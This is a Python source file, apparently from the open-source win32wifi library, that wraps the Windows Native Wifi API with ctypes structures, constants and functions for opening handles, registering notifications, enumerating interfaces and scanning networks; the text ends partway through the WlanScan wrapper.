# win32wifi - Windows Native Wifi Api Python library.
# Copyright (C) 2016 - Shaked Gitelman
#
# Forked from: PyWiWi - <https://github.com/6e726d/PyWiWi>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Author: Andres Blanco     (6e726d)    <6e726d@gmail.com>
# Author: Shaked Gitelman   (almondg)   <shaked.dev@gmail.com>
#

from ctypes import *
from enum import Enum

from comtypes import GUID

from ctypes.wintypes import BOOL
from ctypes.wintypes import DWORD
from ctypes.wintypes import HANDLE
from ctypes.wintypes import LPWSTR
from ctypes.wintypes import LPCWSTR


ERROR_SUCCESS = 0

CLIENT_VERSION_WINDOWS_XP_SP3 = 1
CLIENT_VERSION_WINDOWS_VISTA_OR_LATER = 2

# Windot11.h defines
DOT11_SSID_MAX_LENGTH = 32
DOT11_BSSID_LIST_REVISION_1 = 1

# Ntddndis.h defines
NDIS_OBJECT_TYPE_DEFAULT = 0x80

wlanapi = windll.LoadLibrary('wlanapi.dll')

# The WLAN_INTERFACE_STATE enumerated type indicates the state of an interface.
WLAN_INTERFACE_STATE = c_uint
WLAN_INTERFACE_STATE_DICT = {0: "wlan_interface_state_not_ready",
                             1: "wlan_interface_state_connected",
                             2: "wlan_interface_state_ad_hoc_network_formed",
                             3: "wlan_interface_state_disconnecting",
                             4: "wlan_interface_state_disconnected",
                             5: "wlan_interface_state_associating",
                             6: "wlan_interface_state_discovering",
                             7: "wlan_interface_state_authenticating"}

# The DOT11_MAC_ADDRESS types are used to define an IEEE media access control
# (MAC) address.
DOT11_MAC_ADDRESS = c_ubyte * 6

# The DOT11_BSS_TYPE enumerated type defines a basic service set (BSS) network
# type.
DOT11_BSS_TYPE = c_uint
DOT11_BSS_TYPE_DICT_KV = {
                           1: "dot11_BSS_type_infrastructure",
                           2: "dot11_BSS_type_independent",
                           3: "dot11_BSS_type_any"
                         }
try:
    DOT11_BSS_TYPE_DICT_VK = { v: k for k, v in
            DOT11_BSS_TYPE_DICT_KV.items() }
except AttributeError:
    DOT11_BSS_TYPE_DICT_VK = { v: k for k, v in
            DOT11_BSS_TYPE_DICT_KV.items() }

# The DOT11_PHY_TYPE enumeration defines an 802.11 PHY and media type.
DOT11_PHY_TYPE = c_uint
DOT11_PHY_TYPE_DICT = {0: "dot11_phy_type_unknown",
                       1: "dot11_phy_type_fhss",
                       2: "dot11_phy_type_dsss",
                       3: "dot11_phy_type_irbaseband",
                       4: "dot11_phy_type_ofdm",
                       5: "dot11_phy_type_hrdsss",
                       6: "dot11_phy_type_erp",
                       7: "dot11_phy_type_ht",
                       8: "dot11_phy_type_vht",
                       0x80000000: "dot11_phy_type_IHV_start",
                       0xffffffff: "dot11_phy_type_IHV_end"}

# The DOT11_AUTH_ALGORITHM enumerated type defines a wireless LAN
# authentication algorithm.
DOT11_AUTH_ALGORITHM_TYPE = c_uint
DOT11_AUTH_ALGORITHM_DICT = {1: "DOT11_AUTH_ALGO_80211_OPEN",
                             2: "DOT11_AUTH_ALGO_80211_SHARED_KEY",
                             3: "DOT11_AUTH_ALGO_WPA",
                             4: "DOT11_AUTH_ALGO_WPA_PSK",
                             5: "DOT11_AUTH_ALGO_WPA_NONE",
                             6: "DOT11_AUTH_ALGO_RSNA",
                             7: "DOT11_AUTH_ALGO_RSNA_PSK",
                             0x80000000: "DOT11_AUTH_ALGO_IHV_START",
                             0xffffffff: "DOT11_AUTH_ALGO_IHV_END"}

# The DOT11_CIPHER_ALGORITHM enumerated type defines a cipher algorithm for
# data encryption and decryption.
DOT11_CIPHER_ALGORITHM_TYPE = c_uint
DOT11_CIPHER_ALGORITHM_DICT = {0x00: "DOT11_CIPHER_ALGO_NONE",
                               0x01: "DOT11_CIPHER_ALGO_WEP40",
                               0x02: "DOT11_CIPHER_ALGO_TKIP",
                               0x04: "DOT11_CIPHER_ALGO_CCMP",
                               0x05: "DOT11_CIPHER_ALGO_WEP104",
                               0x100: "DOT11_CIPHER_ALGO_WPA_USE_GROUP",
                               0x100: "DOT11_CIPHER_ALGO_RSN_USE_GROUP",
                               0x101: "DOT11_CIPHER_ALGO_WEP",
                               0x80000000: "DOT11_CIPHER_ALGO_IHV_START",
                               0xffffffff: "DOT11_CIPHER_ALGO_IHV_END"}

DOT11_RADIO_STATE = c_uint
#TODO: values not verified
DOT11_RADIO_STATE_DICT = {0: "dot11_radio_state_unknown",
                          1: "dot11_radio_state_on",
                          2: "dot11_radio_state_off"}

WLAN_REASON_CODE = DWORD
WLAN_SIGNAL_QUALITY = c_ulong

WLAN_MAX_PHY_TYPE_NUMBER = 8

DOT11_RATE_SET_MAX_LENGTH = 126

# WLAN_AVAILABLE_NETWORK Flags
WLAN_AVAILABLE_NETWORK_CONNECTED = 0x00000001
WLAN_AVAILABLE_NETWORK_HAS_PROFILE = 0x00000002
WLAN_AVAILABLE_NETWORK_CONSOLE_USER_PROFILE = 0x00000004

WLAN_AVAILABLE_NETWORK_INCLUDE_ALL_ADHOC_PROFILES = 0x00000001
WLAN_AVAILABLE_NETWORK_INCLUDE_ALL_MANUAL_HIDDEN_PROFILES = 0x00000002

# WLAN Profile Flags
WLAN_PROFILE_GROUP_POLICY = 0x00000001
WLAN_PROFILE_USER = 0x00000002
WLAN_PROFILE_GET_PLAINTEXT_KEY = 0x00000004

# WLAN Notification Registration Flags
WLAN_NOTIFICATION_SOURCE_NONE = 0x0000
WLAN_NOTIFICATION_SOURCE_ONEX = 0x0004
WLAN_NOTIFICATION_SOURCE_ACM = 0x0008
WLAN_NOTIFICATION_SOURCE_MSM = 0x0010
WLAN_NOTIFICATION_SOURCE_SECURITY = 0x0020
WLAN_NOTIFICATION_SOURCE_IHV = 0x0040
WLAN_NOTIFICATION_SOURCE_HNWK = 0x0080
WLAN_NOTIFICATION_SOURCE_ALL = 0xffff

WLAN_NOTIFICATION_SOURCE_DICT = {
    WLAN_NOTIFICATION_SOURCE_NONE:      "WLAN_NOTIFICATION_SOURCE_NONE",
    WLAN_NOTIFICATION_SOURCE_ONEX:      "WLAN_NOTIFICATION_SOURCE_ONEX",
    WLAN_NOTIFICATION_SOURCE_ACM:       "WLAN_NOTIFICATION_SOURCE_ACM",
    WLAN_NOTIFICATION_SOURCE_MSM:       "WLAN_NOTIFICATION_SOURCE_MSM",
    WLAN_NOTIFICATION_SOURCE_SECURITY:  "WLAN_NOTIFICATION_SOURCE_SECURITY",
    WLAN_NOTIFICATION_SOURCE_IHV:       "WLAN_NOTIFICATION_SOURCE_IHV",
    WLAN_NOTIFICATION_SOURCE_HNWK:      "WLAN_NOTIFICATION_SOURCE_HNWK",
    WLAN_NOTIFICATION_SOURCE_ALL:       "WLAN_NOTIFICATION_SOURCE_ALL",
}


class ONEX_NOTIFICATION_TYPE_ENUM(Enum):
    OneXPublicNotificationBase          = 0
    OneXNotificationTypeResultUpdate    = 1
    OneXNotificationTypeAuthRestarted   = 2
    OneXNotificationTypeEventInvalid    = 3
    OneXNumNotifications                = OneXNotificationTypeEventInvalid


class WLAN_NOTIFICATION_ACM_ENUM(Enum):
    wlan_notification_acm_start                         = 0
    wlan_notification_acm_autoconf_enabled              = 1
    wlan_notification_acm_autoconf_disabled             = 2
    wlan_notification_acm_background_scan_enabled       = 3
    wlan_notification_acm_background_scan_disabled      = 4
    wlan_notification_acm_bss_type_change               = 5
    wlan_notification_acm_power_setting_change          = 6
    wlan_notification_acm_scan_complete                 = 7
    wlan_notification_acm_scan_fail                     = 8
    wlan_notification_acm_connection_start              = 9
    wlan_notification_acm_connection_complete           = 10
    wlan_notification_acm_connection_attempt_fail       = 11
    wlan_notification_acm_filter_list_change            = 12
    wlan_notification_acm_interface_arrival             = 13
    wlan_notification_acm_interface_removal             = 14
    wlan_notification_acm_profile_change                = 15
    wlan_notification_acm_profile_name_change           = 16
    wlan_notification_acm_profiles_exhausted            = 17
    wlan_notification_acm_network_not_available         = 18
    wlan_notification_acm_network_available             = 19
    wlan_notification_acm_disconnecting                 = 20
    wlan_notification_acm_disconnected                  = 21
    wlan_notification_acm_adhoc_network_state_change    = 22
    wlan_notification_acm_profile_unblocked             = 23
    wlan_notification_acm_screen_power_change           = 24
    wlan_notification_acm_profile_blocked               = 25
    wlan_notification_acm_scan_list_refresh             = 26
    wlan_notification_acm_end                           = 27


class WLAN_NOTIFICATION_MSM_ENUM(Enum):
    wlan_notification_msm_start                         = 0
    wlan_notification_msm_associating                   = 1
    wlan_notification_msm_associated                    = 2
    wlan_notification_msm_authenticating                = 3
    wlan_notification_msm_connected                     = 4
    wlan_notification_msm_roaming_start                 = 5
    wlan_notification_msm_roaming_end                   = 6
    wlan_notification_msm_radio_state_change            = 7
    wlan_notification_msm_signal_quality_change         = 8
    wlan_notification_msm_disassociating                = 9
    wlan_notification_msm_disconnected                  = 10
    wlan_notification_msm_peer_join                     = 11
    wlan_notification_msm_peer_leave                    = 12
    wlan_notification_msm_adapter_removal               = 13
    wlan_notification_msm_adapter_operation_mode_change = 14
    wlan_notification_msm_end                           = 15


class WLAN_HOSTED_NETWORK_NOTIFICATION_CODE_ENUM(Enum):
    wlan_hosted_network_state_change        = 4096
    wlan_hosted_network_peer_state_change   = 4097
    wlan_hosted_network_radio_state_change  = 4098


WLAN_CONNECTION_MODE = c_uint
WLAN_CONNECTION_MODE_KV = {0: "wlan_connection_mode_profile",
                           1: "wlan_connection_mode_temporary_profile",
                           2: "wlan_connection_mode_discovery_secure",
                           3: "wlan_connection_mode_discovery_unsecure",
                           4: "wlan_connection_mode_auto",
                           5: "wlan_connection_mode_invalid"}
try:
    WLAN_CONNECTION_MODE_VK = { v: k for k, v in
            WLAN_CONNECTION_MODE_KV.items() }
except AttributeError:
    WLAN_CONNECTION_MODE_VK = { v: k for k, v in
            WLAN_CONNECTION_MODE_KV.iteritems() }


class WLAN_INTERFACE_INFO(Structure):
    """
        The WLAN_INTERFACE_INFO structure contains information about a wireless
        LAN interface.

        typedef struct _WLAN_INTERFACE_INFO {
            GUID                 InterfaceGuid;
            WCHAR                strInterfaceDescription[256];
            WLAN_INTERFACE_STATE isState;
        } WLAN_INTERFACE_INFO, *PWLAN_INTERFACE_INFO;
    """
    _fields_ = [("InterfaceGuid", GUID),
                ("strInterfaceDescription", c_wchar * 256),
                ("isState", WLAN_INTERFACE_STATE)]


class WLAN_INTERFACE_INFO_LIST(Structure):
    """
        The WLAN_INTERFACE_INFO_LIST structure contains an array of NIC
        interface information.

        typedef struct _WLAN_INTERFACE_INFO_LIST {
            DWORD               dwNumberOfItems;
            DWORD               dwIndex;
            WLAN_INTERFACE_INFO InterfaceInfo[];
        } WLAN_INTERFACE_INFO_LIST, *PWLAN_INTERFACE_INFO_LIST;
    """
    _fields_ = [("NumberOfItems", DWORD),
                ("Index", DWORD),
                ("InterfaceInfo", WLAN_INTERFACE_INFO * 1)]


class WLAN_PHY_RADIO_STATE(Structure):
    """
    """
    _fields_ = [("dwPhyIndex", DWORD),
                ("dot11SoftwareRadioState", DOT11_RADIO_STATE),
                ("dot11HardwareRadioState", DOT11_RADIO_STATE)]


class WLAN_RADIO_STATE(Structure):
    """
        The WLAN_RADIO_STATE structure specifies the radio state on a list
        of physical layer (PHY) types.

        typedef struct _WLAN_RADIO_STATE {
            DWORD                dwNumberOfPhys;
            WLAN_PHY_RADIO_STATE PhyRadioState[64];
        } WLAN_RADIO_STATE, *PWLAN_RADIO_STATE
    """
    _fields_ = [("dwNumberOfPhys", DWORD),
                ("PhyRadioState", WLAN_PHY_RADIO_STATE * 64)]

class DOT11_SSID(Structure):
    """
        A DOT11_SSID structure contains the SSID of an interface.

        typedef struct _DOT11_SSID {
            ULONG uSSIDLength;
            UCHAR ucSSID[DOT11_SSID_MAX_LENGTH];
        } DOT11_SSID, *PDOT11_SSID;
    """
    _fields_ = [("SSIDLength", c_ulong),
                ("SSID", c_char * DOT11_SSID_MAX_LENGTH)]


class WLAN_RAW_DATA(Structure):
    """
        The WLAN_RAW_DATA structure contains raw data in the form of a blob
        that is used by some Native Wifi functions.

        typedef struct _WLAN_RAW_DATA {
            DWORD dwDataSize;
            BYTE  DataBlob[1];
        } WLAN_RAW_DATA, *PWLAN_RAW_DATA;
    """
    _fields_ = [("DataSize", DWORD),
                ("DataBlob", c_byte * 1)]


class WLAN_RATE_SET(Structure):
    """
        typedef struct _WLAN_RATE_SET {
            ULONG  uRateSetLength;
            USHORT usRateSet[DOT11_RATE_SET_MAX_LENGTH];
        } WLAN_RATE_SET, *PWLAN_RATE_SET;
    """
    _fields_ = [("RateSetLength", c_ulong),
                ("RateSet", c_ushort * DOT11_RATE_SET_MAX_LENGTH)]


class WLAN_BSS_ENTRY(Structure):
    """
        The WLAN_BSS_ENTRY structure contains information about a basic service
        set (BSS).

        typedef struct _WLAN_BSS_ENTRY {
            DOT11_SSID        dot11Ssid;
            ULONG             uPhyId;
            DOT11_MAC_ADDRESS dot11Bssid;
            DOT11_BSS_TYPE    dot11BssType;
            DOT11_PHY_TYPE    dot11BssPhyType;
            LONG              lRssi;
            ULONG             uLinkQuality;
            BOOLEAN           bInRegDomain;
            USHORT            usBeaconPeriod;
            ULONGLONG         ullTimestamp;
            ULONGLONG         ullHostTimestamp;
            USHORT            usCapabilityInformation;
            ULONG             ulChCenterFrequency;
            WLAN_RATE_SET     wlanRateSet;
            ULONG             ulIeOffset;
            ULONG             ulIeSize;
        } WLAN_BSS_ENTRY, *PWLAN_BSS_ENTRY;
    """
    _fields_ = [("dot11Ssid", DOT11_SSID),
                ("PhyId", c_ulong),
                ("dot11Bssid", DOT11_MAC_ADDRESS),
                ("dot11BssType", DOT11_BSS_TYPE),
                ("dot11BssPhyType", DOT11_PHY_TYPE),
                ("Rssi", c_long),
                ("LinkQuality", c_ulong),
                ("InRegDomain", BOOL),
                ("BeaconPeriod", c_ushort),
                ("Timestamp", c_ulonglong),
                ("HostTimestamp", c_ulonglong),
                ("CapabilityInformation", c_ushort),
                ("ChCenterFrequency", c_ulong),
                ("wlanRateSet", WLAN_RATE_SET),
                ("IeOffset", c_ulong),
                ("IeSize", c_ulong)]


class WLAN_BSS_LIST(Structure):
    """
        The WLAN_BSS_LIST structure contains a list of basic service set (BSS)
        entries.

        typedef struct _WLAN_BSS_LIST {
            DWORD          dwTotalSize;
            DWORD          dwNumberOfItems;
            WLAN_BSS_ENTRY wlanBssEntries[1];
        } WLAN_BSS_LIST, *PWLAN_BSS_LIST;
    """
    _fields_ = [("TotalSize", DWORD),
                ("NumberOfItems", DWORD),
                ("wlanBssEntries", WLAN_BSS_ENTRY * 1)]


class WLAN_AVAILABLE_NETWORK(Structure):
    """
        The WLAN_AVAILABLE_NETWORK structure contains information about an
        available wireless network.

        typedef struct _WLAN_AVAILABLE_NETWORK {
            WCHAR                  strProfileName[256];
            DOT11_SSID             dot11Ssid;
            DOT11_BSS_TYPE         dot11BssType;
            ULONG                  uNumberOfBssids;
            BOOL                   bNetworkConnectable;
            WLAN_REASON_CODE       wlanNotConnectableReason;
            ULONG                  uNumberOfPhyTypes;
            DOT11_PHY_TYPE         dot11PhyTypes[WLAN_MAX_PHY_TYPE_NUMBER];
            BOOL                   bMorePhyTypes;
            WLAN_SIGNAL_QUALITY    wlanSignalQuality;
            BOOL                   bSecurityEnabled;
            DOT11_AUTH_ALGORITHM   dot11DefaultAuthAlgorithm;
            DOT11_CIPHER_ALGORITHM dot11DefaultCipherAlgorithm;
            DWORD                  dwFlags;
            DWORD                  dwReserved;
        } WLAN_AVAILABLE_NETWORK, *PWLAN_AVAILABLE_NETWORK;
    """
    _fields_ = [("ProfileName", c_wchar * 256),
                ("dot11Ssid", DOT11_SSID),
                ("dot11BssType", DOT11_BSS_TYPE),
                ("NumberOfBssids", c_ulong),
                ("NetworkConnectable", BOOL),
                ("wlanNotConnectableReason", WLAN_REASON_CODE),
                ("NumberOfPhyTypes", c_ulong),
                ("dot11PhyTypes", DOT11_PHY_TYPE * WLAN_MAX_PHY_TYPE_NUMBER),
                ("MorePhyTypes", BOOL),
                ("wlanSignalQuality", WLAN_SIGNAL_QUALITY),
                ("SecurityEnabled", BOOL),
                ("dot11DefaultAuthAlgorithm", DOT11_AUTH_ALGORITHM_TYPE),
                ("dot11DefaultCipherAlgorithm", DOT11_CIPHER_ALGORITHM_TYPE),
                ("Flags", DWORD),
                ("Reserved", DWORD)]


class WLAN_AVAILABLE_NETWORK_LIST(Structure):
    """
        The WLAN_AVAILABLE_NETWORK_LIST structure contains an array of
        information about available networks.

        typedef struct _WLAN_AVAILABLE_NETWORK_LIST {
            DWORD                  dwNumberOfItems;
            DWORD                  dwIndex;
            WLAN_AVAILABLE_NETWORK Network[1];
        } WLAN_AVAILABLE_NETWORK_LIST, *PWLAN_AVAILABLE_NETWORK_LIST;
    """
    _fields_ = [("NumberOfItems", DWORD),
                ("Index", DWORD),
                ("Network", WLAN_AVAILABLE_NETWORK * 1)]


class WLAN_PROFILE_INFO(Structure):
    """
        The WLAN_PROFILE_INFO structure contains basic information about a
        profile.

        typedef struct _WLAN_PROFILE_INFO {
            WCHAR strProfileName[256];
            DWORD dwFlags;
        } WLAN_PROFILE_INFO, *PWLAN_PROFILE_INFO;
    """
    _fields_ = [("ProfileName", c_wchar * 256),
                ("Flags", DWORD)]


class WLAN_PROFILE_INFO_LIST(Structure):
    """
        The WLAN_PROFILE_INFO_LIST structure contains a list of wireless
        profile information.

        typedef struct _WLAN_PROFILE_INFO_LIST {
            DWORD             dwNumberOfItems;
            DWORD             dwIndex;
            WLAN_PROFILE_INFO ProfileInfo[1];
        } WLAN_PROFILE_INFO_LIST, *PWLAN_PROFILE_INFO_LIST;
    """
    _fields_ = [("NumberOfItems", DWORD),
                ("Index", DWORD),
                ("ProfileInfo", WLAN_PROFILE_INFO * 1)]


class WLAN_NOTIFICATION_DATA(Structure):
    """
        The WLAN_NOTIFICATION_DATA structure contains information provided
        when receiving notifications.

        typedef struct _WLAN_NOTIFICATION_DATA {
          DWORD NotificationSource;
          DWORD NotificationCode;
          GUID  InterfaceGuid;
          DWORD dwDataSize;
          PVOID pData;
        } WLAN_NOTIFICATION_DATA, *PWLAN_NOTIFICATION_DATA;
    """
    _fields_ = [("NotificationSource", DWORD),
                ("NotificationCode", DWORD),
                ("InterfaceGuid", GUID),
                ("dwDataSize", DWORD),
                ("pData", c_void_p)]


class WLAN_NOTIFICATION_CALLBACK():
    """
        The WLAN_NOTIFICATION_CALLBACK allback function prototype defines
        the type of notification callback function.

        typedef VOID ( WINAPI *WLAN_NOTIFICATION_CALLBACK)(
           PWLAN_NOTIFICATION_DATA data,
           PVOID                   context
        );
    """
    _fields_ = [("data", POINTER(WLAN_NOTIFICATION_DATA)),
                ("context", c_void_p)]


class WLAN_MSM_NOTIFICATION_DATA(Structure):
    """
    typedef struct _WLAN_MSM_NOTIFICATION_DATA {
        WLAN_CONNECTION_MODE wlanConnectionMode;
        WCHAR                strProfileName[WLAN_MAX_NAME_LENGTH];
        DOT11_SSID           dot11Ssid;
        DOT11_BSS_TYPE       dot11BssType;
        DOT11_MAC_ADDRESS    dot11MacAddr;
        BOOL                 bSecurityEnabled;
        BOOL                 bFirstPeer;
        BOOL                 bLastPeer;
        WLAN_REASON_CODE     wlanReasonCode;
    } WLAN_MSM_NOTIFICATION_DATA, *PWLAN_MSM_NOTIFICATION_DATA;
    """
    _fields_ = [("wlanConnectionMode", WLAN_CONNECTION_MODE),
                ("strProfileName", c_wchar * 256),
                ("dot11Ssid", DOT11_SSID),
                ("dot11BssType", DOT11_BSS_TYPE),
                ("dot11MacAddr", DOT11_MAC_ADDRESS),
                ("bSecurityEnabled", BOOL),
                ("bFirstPeer", BOOL),
                ("bLastPeer", BOOL),
                ("wlanReasonCode", WLAN_REASON_CODE),]


WLAN_NOTIFICATION_DATA_MSM_TYPES_DICT = {
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_associating: WLAN_MSM_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_associated: WLAN_MSM_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_authenticating: WLAN_MSM_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_connected: WLAN_MSM_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_roaming_start: WLAN_MSM_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_roaming_end: WLAN_MSM_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_radio_state_change: None,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_signal_quality_change: c_ulong,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_disassociating: WLAN_MSM_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_disconnected: WLAN_MSM_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_peer_join: WLAN_MSM_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_peer_leave: WLAN_MSM_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_adapter_removal: WLAN_MSM_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_MSM_ENUM.wlan_notification_msm_adapter_operation_mode_change: c_ulong,
}

class WLAN_CONNECTION_NOTIFICATION_DATA(Structure):
    """
    typedef struct _WLAN_CONNECTION_NOTIFICATION_DATA {
        WLAN_CONNECTION_MODE wlanConnectionMode;
        WCHAR                strProfileName[WLAN_MAX_NAME_LENGTH];
        DOT11_SSID           dot11Ssid;
        DOT11_BSS_TYPE       dot11BssType;
        BOOL                 bSecurityEnabled;
        WLAN_REASON_CODE     wlanReasonCode;
        DWORD                dwFlags;
        WCHAR                strProfileXml[1];
    } WLAN_CONNECTION_NOTIFICATION_DATA, *PWLAN_CONNECTION_NOTIFICATION_DATA;
    """
    _fields_ = [("wlanConnectionMode", WLAN_CONNECTION_MODE),
                ("strProfileName", c_wchar * 256),
                ("dot11Ssid", DOT11_SSID),
                ("dot11BssType", DOT11_BSS_TYPE),
                ("bSecurityEnabled", BOOL),
                ("wlanReasonCode", WLAN_REASON_CODE),
                ("dwFlags", DWORD),
                ("strProfileXml", (c_wchar * 1)),]


WLAN_NOTIFICATION_DATA_ACM_TYPES_DICT = {
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_autoconf_enabled: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_autoconf_disabled: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_background_scan_enabled: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_background_scan_disabled: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_bss_type_change: DOT11_BSS_TYPE,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_power_setting_change: None,  # TODO: Change to WLAN_POWER_SETTING
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_scan_complete: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_scan_fail: WLAN_REASON_CODE,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_connection_start: WLAN_CONNECTION_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_connection_complete: WLAN_CONNECTION_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_connection_attempt_fail: WLAN_CONNECTION_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_filter_list_change: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_interface_arrival: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_interface_removal: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_profile_change: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_profile_name_change: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_profiles_exhausted: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_network_not_available: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_network_available: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_disconnecting: WLAN_CONNECTION_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_disconnected: WLAN_CONNECTION_NOTIFICATION_DATA,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_adhoc_network_state_change: None,  # TODO: Change to WLAN_ADHOC_NETWORK_STATE
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_profile_unblocked: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_screen_power_change: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_profile_blocked: None,
    WLAN_NOTIFICATION_ACM_ENUM.wlan_notification_acm_scan_list_refresh: None,
}

def WlanRegisterNotification(hClientHandle, callback):
    """
        The WlanRegisterNotification function is used to register and
        unregister notifications on all wireless interfaces.

        DWORD WINAPI WlanRegisterNotification(
          _In_       HANDLE                      hClientHandle,
          _In_       DWORD                       dwNotifSource,
          _In_       BOOL                        bIgnoreDuplicate,
          _In_opt_   WLAN_NOTIFICATION_CALLBACK  funcCallback,
          _In_opt_   PVOID                       pCallbackContext,
          _Reserved_ PVOID                       pReserved,
          _Out_opt_  PDWORD                      pdwPrevNotifSource
        );
    """
    WLAN_NOTIFICATION_CALLBACK_M = CFUNCTYPE(None,  # type for return value
                                             POINTER(WLAN_NOTIFICATION_DATA),
                                             c_void_p,
                                             use_last_error=True)

    func_ref = wlanapi.WlanRegisterNotification
    func_ref.argtypes = [
        HANDLE,
        DWORD,
        BOOL,
        WLAN_NOTIFICATION_CALLBACK_M,
        c_void_p,
        c_void_p,
        POINTER(DWORD)]
    func_ref.restype = DWORD

    dwNotifSource = WLAN_NOTIFICATION_SOURCE_ALL
    bIgnoreDuplicate = True
    funcCallback = WLAN_NOTIFICATION_CALLBACK_M(callback)
    pCallbackContext = None
    pdwPrevNotifSource = None

    result = func_ref(hClientHandle,
                      dwNotifSource,
                      bIgnoreDuplicate,
                      funcCallback,
                      pCallbackContext,
                      None,
                      pdwPrevNotifSource)

    if result != ERROR_SUCCESS:
        raise WinError(result)
    return funcCallback


def WlanOpenHandle():
    """
        The WlanOpenHandle function opens a connection to the server.

        DWORD WINAPI WlanOpenHandle(
            _In_        DWORD dwClientVersion,
            _Reserved_  PVOID pReserved,
            _Out_       PDWORD pdwNegotiatedVersion,
            _Out_       PHANDLE phClientHandle
        );
    """
    func_ref = wlanapi.WlanOpenHandle
    func_ref.argtypes = [DWORD, c_void_p, POINTER(DWORD), POINTER(HANDLE)]
    func_ref.restype = DWORD
    negotiated_version = DWORD()
    client_handle = HANDLE()
    result = func_ref(2, None, byref(negotiated_version), byref(client_handle))
    if result != ERROR_SUCCESS:
        raise Exception("WlanOpenHandle failed.")
    return client_handle


def WlanCloseHandle(hClientHandle):
    """
        The WlanCloseHandle function closes a connection to the server.

        DWORD WINAPI WlanCloseHandle(
            _In_        HANDLE hClientHandle,
            _Reserved_  PVOID pReserved
        );
    """
    func_ref = wlanapi.WlanCloseHandle
    func_ref.argtypes = [HANDLE, c_void_p]
    func_ref.restype = DWORD
    result = func_ref(hClientHandle, None)
    if result != ERROR_SUCCESS:
        raise Exception("WlanCloseHandle failed.")
    return result


def WlanFreeMemory(pMemory):
    """
        The WlanFreeMemory function frees memory. Any memory returned from
        Native Wifi functions must be freed.

        VOID WINAPI WlanFreeMemory(
            _In_  PVOID pMemory
        );
    """
    func_ref = wlanapi.WlanFreeMemory
    func_ref.argtypes = [c_void_p]
    func_ref(pMemory)


def WlanEnumInterfaces(hClientHandle):
    """
        The WlanEnumInterfaces function enumerates all of the wireless LAN
        interfaces currently enabled on the local computer.

        DWORD WINAPI WlanEnumInterfaces(
            _In_        HANDLE hClientHandle,
            _Reserved_  PVOID pReserved,
            _Out_       PWLAN_INTERFACE_INFO_LIST *ppInterfaceList
        );
    """
    func_ref = wlanapi.WlanEnumInterfaces
    func_ref.argtypes = [HANDLE,
                         c_void_p,
                         POINTER(POINTER(WLAN_INTERFACE_INFO_LIST))]
    func_ref.restype = DWORD
    wlan_ifaces = pointer(WLAN_INTERFACE_INFO_LIST())
    result = func_ref(hClientHandle, None, byref(wlan_ifaces))
    if result != ERROR_SUCCESS:
        raise Exception("WlanEnumInterfaces failed.")
    return wlan_ifaces


def WlanScan(hClientHandle, pInterfaceGuid, ssid=""):
    """
        The WlanScan function requests a scan for available networks on the
        indicated interface.

        DWORD WINAPI WlanScan(
            _In_        HANDLE hClientHandle,
            _In_        const GUID *pInterfaceGuid,
            _In_opt_    const PDOT11_SSID pDot11Ssid,
            _In_opt_    const PWLAN_RAW_DATA pIeData,
            _Reserved_  PVOID pReserved
        );
    """
    func_ref = wlanapi.WlanScan
    func_ref.argtypes = [HANDLE,
                         POINTER(GUID),
                         POINTER(DOT11_SSID),
                         POINTER(WLAN_RAW_DATA),
                         c_void_p]
    func_ref.restype = DWORD
    if ssid:
        length = len(ssid)
        if length > DOT11_SSID_MAX_LENGTH:
